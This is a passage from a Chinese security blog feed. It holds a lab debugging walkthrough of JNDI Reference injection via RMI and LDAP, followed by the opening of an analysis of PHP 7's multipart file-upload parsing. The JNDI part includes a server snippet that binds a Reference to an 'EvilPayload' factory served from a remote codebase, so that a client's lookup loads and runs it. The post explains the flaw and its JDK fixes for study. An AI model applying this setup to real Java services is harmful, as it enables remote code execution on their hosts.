src="/posts/ad3be040/r-165.png" title="decodeObject"></p><p>然后调用<code>NamingManager.getObjectInstance</code>方法，继续跟进，这里用注释解释一些步骤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">      <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                        Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">      <span class="keyword">throws</span> Exception</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">      ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//使用工厂，若工厂变量存在被赋值，就用赋值的工厂去构建对象，默认为null</span></span><br><span class="line">      <span class="comment">// Use builder if installed</span></span><br><span class="line">      <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">      <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">// builder must return non-null factory</span></span><br><span class="line">          factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">          <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">              environment);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//判断对象是否实现Reference或者Referenceable</span></span><br><span class="line">      <span class="comment">// Use reference if possible</span></span><br><span class="line">      <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">          ref = (Reference) refInfo;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">          ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Object answer;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//工厂存在、并且对象是Reference类，工厂类名能获取到，就对该对象进行工厂构建实例化对象</span></span><br><span class="line">      <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">          <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">              <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">              factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">              <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                   environment);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">              <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">              <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">              <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">              <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">              answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">              <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> answer;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//上面的情况都不存在，没有工厂，对象也不是Reference类，就搜寻其它符合条件的的工厂，存在就返回工厂，否则返回null</span></span><br><span class="line">      <span class="comment">// try using any specified factories</span></span><br><span class="line">      answer =</span><br><span class="line">          createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">      <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在该方法中，由于构建器未创建因此<code>builder</code>为<code>null</code>，同时该动态代理<code>stub</code>不属于<code>Reference/Referenceable</code>，因此找不到对应的工厂无法进行创建对象实例化，最后调用<code>createObjectFromFactories</code>方法寻找符合条件的工厂，不存在符合条件的工厂，因此返回<code>null</code>，到此结束创建过程，最后只获得<code>rmi</code>的远程服务<code>stub</code>进行通讯</p><p><img src="/posts/ad3be040/r-166.png" title="NamingManager.getObjectInstance"></p><p>总结描述就是：JNDI通过上下文对rmi字符串进行解析，识别到rmi协议，判断是否是远程引用（References类），不是的话再由rmi调用方式去执行代码。</p><h3 id="2、References-rmi注入调试分析"><a href="#2、References-rmi注入调试分析" class="headerlink" title="2、References-rmi注入调试分析"></a>2、References-rmi注入调试分析</h3><p>JNDI-rmi服务端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        ic.rebind(&quot;rmi://localhost:1099/RMIObject&quot;,new RMIObjectImpl());</span></span><br><span class="line">        Reference rf=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;2EvilPayload&quot;</span>,<span class="string">&quot;EvilPayload&quot;</span>,<span class="string">&quot;http://localhost:8999/&quot;</span>);</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,rf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>JNDI-rmi客户端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">    InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">    System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1）环境准备</strong><br>当前测试环境为jdk1.8.0_66(漏洞在jdk8_121处进行防护措施),在调试前需要添加sun包，idea导入默认的jdk1.8.0_66版本没有sun.jndi的包，调试中会遇到jndi包会进入class文件，不利于调试，因此需要手动导入sun.jndi包</p><p>源码下载：<a href="https://hg.openjdk.java.net/jdk8/jdk8/jdk/">https://hg.openjdk.java.net/jdk8/jdk8/jdk/</a></p><p><img src="/posts/ad3be040/r-145.png" title="sun源码下载"></p><p>下载过后，将对应sun.jndi包导入jdk根目录src.zip中，然后重新加载一下即可</p><p><img src="/posts/ad3be040/r-146.png" title="sun源码导入"><br><img src="/posts/ad3be040/r-147.png" title="sun源码导入"></p><p>接下来就能对当前java版本进行调试了</p><p><img src="/posts/ad3be040/r-148.png" title="调试"></p><p><strong>2）分析调试</strong><br>前半段部分跟原生rmi分析一样，不重复分析，进入到不同的代码逻辑中分析，直到<code>RegistryContext.lookup</code>方法这里获取obj对象。</p><p><img src="/posts/ad3be040/r-168.png" title="DecodeObject"></p><p>通过<code>RegistryImpl_Stub.lookup</code>查询对象，本身返回的是远程对象的<code>stub</code>如上面分析那样获取远程对象的动态代理<code>stub</code>，但这里返回<code>ReferenceWrapper_Stub</code></p><p><img src="/posts/ad3be040/r-169.png" title="RegistryImpl_Stub.lookup"></p><p>导致返回<code>ReferenceWrapper_Stub</code>的原因在服务端进行<code>rebind</code>的时候进行的<code>encodeObject</code></p><p><img src="/posts/ad3be040/r-170.png" title="rebind"></p><p>跟进绑定，这里直接截取关键步骤到<code>RegistryContext.rebind</code>方法，这里在对对象绑定时，多了一个<code>encodeObject</code>步骤</p><p><img src="/posts/ad3be040/r-171.png" title="rebind"></p><p>这里针对<code>obj</code>对象属于<code>Reference</code>类的话，就强制转换成<code>ReferenceWrapper</code>对象，因此实际绑定的是<code>ReferenceWrapper_stub</code>对象，在上面远程获取对象<code>stub</code>的时候会获取到<code>ReferenceWrapper_stub</code></p><p><img src="/posts/ad3be040/r-172.png" title="lookup"></p><p>回到客户端主体上来，获取到<code>ReferenceWrapper_stub</code>对象过后，运行<code>decodeObject</code>方法</p><p><img src="/posts/ad3be040/r-173.png" title="encodeObject"></p><p>跟进<code>decodeObject</code>方法，此时判断远程对象属于是<code>RemoteReference</code>类，因此调用<code>getReference()</code>方法返回引用对象</p><p><img src="/posts/ad3be040/r-167.png" title="DecodeObject"></p><p>然后调用<code>NamingManager.getObjectInstance</code>方法，继续跟进</p><p><img src="/posts/ad3be040/r-174.png" title="NamingManager.getObjectInstance"></p><p>这里同样显示查看是否存在构造器，由于未创建，因此<code>builder</code>为<code>null</code>，再判断远程对象是否属于引用类（<code>Reference</code>），属于，然后将引用对象信息赋值给<code>ref</code>变量</p><p><img src="/posts/ad3be040/r-175.png" title="NamingManager.getObjectInstance"></p><p>接着<code>ref</code>已经被赋值，因此进入判断体，变量<code>f</code>为获取远程对象的工厂类名，<code>ref</code>存在、<code>f</code>存在，通过<code>getObjectFactoryFromReference</code>方法从引用中获取对象工厂，跟进<code>getObjectFactoryFromReference</code>方法</p><p><img src="/posts/ad3be040/r-176.png" title="getObjectFactoryFromReference"></p><p><code>getObjectFactoryFromReference</code>方法通过类加载直接加载工厂名</p><p><img src="/posts/ad3be040/r-177.png" title="loadClass"></p><p>通过本地类加载器去加载工厂类</p><p><img src="/posts/ad3be040/r-178.png" title="loadClass"></p><p>由于是远程地址的工厂，本地加载器查询不到的远程的工厂，因此<code>cla</code>为<code>null</code></p><p><img src="/posts/ad3be040/r-179.png" title="loadClass"></p><p>接着调用<code>ref.getFactoryClassLocation()</code>查看工厂类地址，返回远程地址</p><p><img src="/posts/ad3be040/r-180.png" title="getFactoryClassLocation()"></p><p>然后再调用类加载去加载<code>codebase</code>远程地址</p><p><img src="/posts/ad3be040/r-181.png" title="getFactoryClassLocation()"></p><p>这里通过调用<code>URLClassLoader</code>类加载器去创建出<code>FactoryURLClassLoader</code>工厂<code>URL</code>类加载器，然后通过这个工厂<code>URL</code>类加载器去远程加载恶意工厂</p><p><img src="/posts/ad3be040/r-182.png" title="FactoryURLClassLoader"></p><p><img src="/posts/ad3be040/r-185.png" title="远程地址"></p><p>获取到加载器后，就调用加载器实例化<code>newInstance()</code>，此时恶意工厂的构造函数被执行，触发漏洞</p><p><img src="/posts/ad3be040/r-183.png" title="newInstance()"></p><p><img src="/posts/ad3be040/r-184.png" title="漏洞触发"></p><p><strong>调用链</strong><br>由上面分析步骤得到JNDI-rmi的Reference注入调用链：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RegistryContext.DecodeObject()</span><br><span class="line">    -&gt;NamingManager.getObjectInstance()</span><br><span class="line">        -&gt;factory.getObjectInstance()</span><br></pre></td></tr></table></figure><p><strong>3）疑惑</strong><br>在运行一次引用注入过后，每一步调试不再去请求远程地址，通过本地的类加载器也能加载工厂进行实例化。</p><p>原因：在构造过后本地项目out目录下生成了远程工厂的类，因此在下次执行的时候在本地类加载的时候就能获取到该类信息。（具体在哪个步骤导致的没发现，本地文件删除过后，后面就没写入了）</p><h3 id="3、References-ldap注入调试分析"><a href="#3、References-ldap注入调试分析" class="headerlink" title="3、References-ldap注入调试分析"></a>3、References-ldap注入调试分析</h3><p>lookup下断点分析</p><p><img src="/posts/ad3be040/r-191.png" title="lookup"></p><p>同样的步骤通过<code>getURLOrDefaultInitCtx</code>方法获取字符串上下文，判断协议前缀调用对象类的上下文，前面分析过了，这里直接过掉</p><p><img src="/posts/ad3be040/r-192.png" title="getURLOrDefaultInitCtx"></p><p>通过协议前缀获取到<code>ldapURLContext</code>上下文，进入它的<code>lookup</code>方法</p><p><img src="/posts/ad3be040/r-193.png" title="ldapURLContext"></p><p>通过<code>hasQueryComponents</code>方法查询字符串结尾是否存在?号（如ldap:&#x2F;&#x2F;localhost:9999&#x2F;?），存在就抛出异常，接着跟进<code>super.lookup</code>方法，也就是父类的<code>lookup</code>方法</p><p>同样调用<code>getRootURLContext</code>方法分割解析路径获取解析结果，在调用<code>getResolvedObj</code>方法获取解析结果对象<code>LdapCtx</code></p><p><img src="/posts/ad3be040/r-194.png" title="GenericURLContext.lookup"></p><p>跟进<code>ctx.lookup</code></p><p><img src="/posts/ad3be040/r-194.png" title="ctx.lookup"></p><p>获取一些相关属性过后，调用<code>LdapCtx.lookup</code>方法（调用到父类<code>ComponentDirContext</code>的<code>.lookup</code>方法），继续跟进</p><p><img src="/posts/ad3be040/r-195.png" title="ComponentDirContext.lookup"></p><p>通过<code>p_resolveIntermediate</code>方法解析运行介质，进入<code>TERMINAL_COMPONENT</code>终端组件分支（我是这么理解的），然后调用<code>c_lookup</code>方法，跟进</p><p><img src="/posts/ad3be040/r-196.png" title="LdapCtx.c_lookup"></p><p>获取到远程<code>ldap</code>的<code>entry</code>后赋值给<code>attr</code>保存，开始解码对象信息</p><p><img src="/posts/ad3be040/r-197.png" title="decodeObject"></p><p>先是获取到<code>codebase</code>也就是<code>ldap</code>服务地址，然后判断字段属性，根据不同属性进行不同的解析（如果是序列化对象就用反序列化解析对象，如果是远程对象，就用rmi解析对象），</p><p><img src="/posts/ad3be040/r-198.png" title="JAVA_ATTRIBUTES"></p><p>这里是引用对象，因此会走到引用对象判断里，调用<code>decodeReference</code>方法</p><p><img src="/posts/ad3be040/r-199.png" title="引用对象"></p><p>跟进<code>decodeReference</code>方法，获取类名、工厂，然后创建引用对象信息<code>ref</code></p><p><img src="/posts/ad3be040/r-200.png" title="引用对象ref"></p><p>获取到<code>ref</code>引用对象<code>Obj</code>后，调用<code>DirectoryManager.getObjectInstance</code>静态方法，跟进</p><p><img src="/posts/ad3be040/r-201.png" title="DirectoryManager.getObjectInstance"><br><img src="/posts/ad3be040/r-202.png" title="DirectoryManager.getObjectInstance"></p><p>可以看到这里的方法跟上面<code>jndi-rmi</code>最后调用实例化的方法<code>NamingManager.getObjectInstance</code>非常相似，相关判断描述在<code>jndi-rmi</code>分析过了就接着下面</p><p>获取到工厂对象信息、工厂类名后，然后通过<code>getObjectFactoryFromReference</code>构建工厂</p><p><img src="/posts/ad3be040/r-203.png" title="getObjectFactoryFromReference"></p><p>跟进，类加载工厂类名</p><p><img src="/posts/ad3be040/r-204.png" title="loadClass"></p><p>同样本地不存在该工厂类（该类为ldap远程的恶意类，本地加载器在本地搜索不到该类），传入<code>codebase</code>进行类加载，继续跟进</p><p><img src="/posts/ad3be040/r-205.png" title="loadClass"></p><p>同样的步骤通过<code>URLClassLoader</code> URL加载器远程加载对象类</p><p><img src="/posts/ad3be040/r-206.png" title="URLClassLoader.newInstance"></p><p>获取URLClassLoader类加载器后，再次进行类加载</p><p><img src="/posts/ad3be040/r-207.png" title="loadClass"></p><p>此时通过反射成功获取到远程类对象。</p><p><img src="/posts/ad3be040/r-208.png" title="loadClass"></p><p>然后返回类对象，最后对类对象进行实例化，触发漏洞，最后的步骤跟jndi调用rmi时步骤一样</p><p><img src="/posts/ad3be040/r-209.png" title="newInstance"><br><img src="/posts/ad3be040/r-210.png" title="触发漏洞"></p><h1 id="0x04、修复范围"><a href="#0x04、修复范围" class="headerlink" title="0x04、修复范围"></a>0x04、修复范围</h1><p>JNDI-RMI:<br><font color="red">JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121</font>开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。<br><font color="red">JDK 6u132, JDK 7u122, JDK 8u113</font>开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p><p>JNDI-LDAP:<br>2018年10月，Java修复了该利用点，对LDAP Reference远程工厂类的加载增加了限制<br>范围：<font color="red">Oracle JDK 11.0.1、8u191、7u201、6u211</font>之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，需要人工调整至true</p><p>引用网上的一张修复时间轴:</p><p><img src="/posts/ad3be040/r-190.png" title="漏洞修复时间轴"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>可以看到LDAP的利用限制仅限制于服务器JAVA版本，没有其他限制，而RMI除了java版本限制以外，还存在利用链依赖组件条件满足才能去触发漏洞。</p><p>总的来说rmi和ldap的利用情况和源码层面很类似，Jndi根据不同协议进入不同的上下文处理，但在漏洞版本内都到最后进行远程调用恶意类实例化对象触发漏洞。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a><br><a href="https://www.bilibili.com/video/BV1L3411a7ax/">https://www.bilibili.com/video/BV1L3411a7ax/</a><br><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a><br><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a href="https://blog.csdn.net/qq_35029061/article/details/126160669">https://blog.csdn.net/qq_35029061/article/details/126160669</a><br><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie">https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie</a><br><a href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php7内核rfc1867协议对文件上传的过滤浅析</title>
      <link href="/posts/9fa41563.html"/>
      <url>/posts/9fa41563.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>在对php7环境下的普通文件上传，自动过滤了特殊符号，通过<code>$_files[file][name]</code>获取到文件名引发的思考。</p><h1 id="0x01、背景"><a href="#0x01、背景" class="headerlink" title="0x01、背景"></a>0x01、背景</h1><p>测试环境：<br>php：7.3.4</p><p>简单的文件上传源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;post&quot;</span></span><br><span class="line">      enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_POST</span>[<span class="string">&quot;str&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="comment">//echo phpinfo();</span></span><br><span class="line">    <span class="comment">//move uploaded file($file[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $file[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件上传过程中，<code>$_files[file][name]</code>获取到&#x2F;或者\后的文件名，前面的符号被自动过滤<br><img src="/posts/9fa41563/php-1.png" title="文件上传"></p><p>换了不同的web应用，都是同样的情况，猜测php内核对文件上传的信息做了处理</p><h1 id="0x02、rfc1867协议"><a href="#0x02、rfc1867协议" class="headerlink" title="0x02、rfc1867协议"></a>0x02、rfc1867协议</h1><blockquote><p>RCF1867是Form-based File Upload in HTML标准协议，该协议在html基础上为input元素的type属性增加了一个file选项，同时限定了Form的method必须为POST，ENCTYPE必须为multipart&#x2F;form-data</p></blockquote><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>主体程序SAPI_POST_HANDLER_FUNC方法，主体前面是初始化，声明一些变量和相关函数</p><p><img src="/posts/9fa41563/php-3.png" title="主体函数"></p><h2 id="获取boundary"><a href="#获取boundary" class="headerlink" title="获取boundary"></a>获取boundary</h2><p>后面开始先获取boundary值</p><p><img src="/posts/9fa41563/php-4.png" title="主体函数"></p><p>获取过程中对boundary进行合法性校验</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断boundary中是否存在=号</span></span><br><span class="line"><span class="keyword">if</span> (!boundary || !(boundary = <span class="built_in">strchr</span>(boundary, <span class="string">&#x27;=&#x27;</span>))) &#123;</span><br><span class="line">sapi_module.sapi_error(E_WARNING, <span class="string">&quot;Missing boundary in multipart/form-data POST data&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boundary++;</span><br><span class="line">boundary_len = (<span class="type">int</span>)<span class="built_in">strlen</span>(boundary);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断boundary是否以&quot;开头,以&quot;结尾，判断为不合法</span></span><br><span class="line">  <span class="keyword">if</span> (boundary[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">boundary++;</span><br><span class="line">boundary_end = <span class="built_in">strchr</span>(boundary, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!boundary_end) &#123;</span><br><span class="line">sapi_module.sapi_error(E_WARNING, <span class="string">&quot;Invalid boundary in multipart/form-data POST data&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* search for the end of the boundary */</span></span><br><span class="line">boundary_end = <span class="built_in">strpbrk</span>(boundary, <span class="string">&quot;,;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>boundary获取后，对buffer流进行初始化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Initialize the buffer */</span></span><br><span class="line"><span class="keyword">if</span> (!(mbuff = <span class="title function_ invoke__">multipart_buffer_new</span>(boundary, boundary_len))) &#123;</span><br><span class="line">sapi_module.<span class="title function_ invoke__">sapi_error</span>(E_WARNING, <span class="string">&quot;Unable to initialize the input buffer&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来也是一些初始化工作</p><p><img src="/posts/9fa41563/php-5.png" title="初始化"></p><h2 id="解析Content-Disposition"><a href="#解析Content-Disposition" class="headerlink" title="解析Content-Disposition"></a>解析Content-Disposition</h2><p>接下来就是解析multipart&#x2F;form-data内容字段</p><p><img src="/posts/9fa41563/php-6.png" title="解析字段"></p><p>声明了一些变量过后，开始解析头部数据</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">multipart_buffer_headers</span>(mbuff, &amp;header)) &#123;</span><br><span class="line"><span class="keyword">goto</span> fileupload_done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取Content-Disposition字段</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((cd = php_mime_get_hdr_value(header, <span class="string">&quot;Content-Disposition&quot;</span>))) &#123;</span><br></pre></td></tr></table></figure><p>通过getword方法用”;”分割Content-Disposition字段值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (*cd &amp;&amp; (pair = <span class="title function_ invoke__">getword</span>(mbuff-&gt;input_encoding, &amp;cd, <span class="string">&#x27;;&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">char *key = <span class="literal">NULL</span>, *word = pair;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">isspace</span>(*cd)) &#123;</span><br><span class="line">++cd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在键值对后,再通过getword方法用”&#x3D;”分割键值对获取key名，然后判断Key值为”name”还是”filename”</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(<span class="built_in">pair</span>, <span class="string">&#x27;=&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">//通过getword方法获取=前面的key值</span></span><br><span class="line">      key = getword(mbuff-&gt;input_encoding, &amp;<span class="built_in">pair</span>, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//key为name的情况</span></span><br><span class="line">      <span class="keyword">if</span> (!strcasecmp(key, <span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (param) &#123;</span><br><span class="line">efree(param);</span><br><span class="line">&#125;</span><br><span class="line">param = getword_conf(mbuff-&gt;input_encoding, <span class="built_in">pair</span>);</span><br><span class="line"><span class="keyword">if</span> (mbuff-&gt;input_encoding &amp;&amp; internal_encoding) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *new_param;</span><br><span class="line"><span class="type">size_t</span> new_param_len;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>)<span class="number">-1</span> != zend_multibyte_encoding_converter(&amp;new_param, &amp;new_param_len, (<span class="type">unsigned</span> <span class="type">char</span> *)param, <span class="built_in">strlen</span>(param), internal_encoding, mbuff-&gt;input_encoding)) &#123;</span><br><span class="line">efree(param);</span><br><span class="line">param = (<span class="type">char</span> *)new_param;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//key为filename的情况</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(key, <span class="string">&quot;filename&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (filename) &#123;</span><br><span class="line">efree(filename);</span><br><span class="line">&#125;</span><br><span class="line">filename = getword_conf(mbuff-&gt;input_encoding, <span class="built_in">pair</span>);</span><br><span class="line"><span class="keyword">if</span> (mbuff-&gt;input_encoding &amp;&amp; internal_encoding) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *new_filename;</span><br><span class="line"><span class="type">size_t</span> new_filename_len;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>)<span class="number">-1</span> != zend_multibyte_encoding_converter(&amp;new_filename, &amp;new_filename_len, (<span class="type">unsigned</span> <span class="type">char</span> *)filename, <span class="built_in">strlen</span>(filename), internal_encoding, mbuff-&gt;input_encoding)) &#123;</span><br><span class="line">efree(filename);</span><br><span class="line">filename = (<span class="type">char</span> *)new_filename;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面主要涉及两个方法：getword、getword_conf</p><p><img src="/posts/9fa41563/php-7.png" title="getword"></p><p>getword:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">php_ap_getword</span><span class="params">(<span class="type">const</span> zend_encoding *encoding, <span class="type">char</span> **line, <span class="type">char</span> stop)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *pos = *line, quote;</span><br><span class="line"><span class="type">char</span> *res;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//读取词条，指针存在并且不只想结结束符号即进入循环</span></span><br><span class="line">  <span class="keyword">while</span> (*pos 